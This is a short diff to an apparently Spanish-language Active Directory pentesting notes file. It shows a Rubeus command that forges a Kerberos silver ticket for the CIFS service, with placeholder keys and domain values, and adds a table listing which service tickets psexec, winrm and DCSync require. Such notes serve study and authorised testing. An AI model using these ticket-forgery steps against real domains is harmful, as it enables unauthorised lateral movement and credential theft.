@@ -639,6 +639,11 @@ En la otra maquina, crea un TGS con los datos
 ```
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/EQUIPO_LLAVES_KERBEROS.DOMINIO /aes256:EQUIPO_LLAVE_KERBEROS /user:USUARIO /domain:DOMINIO /sid:SID_DOMINIO /nowrap
 ```
+Technique     | Required Service Tickets
+------------- | -------------
+psexec        | HOST & CIFS
+winrm         | HOST & CIFS
+dcsync        | LDAP
 
 # Forest & Domain Trusts
 ## Parent/Child
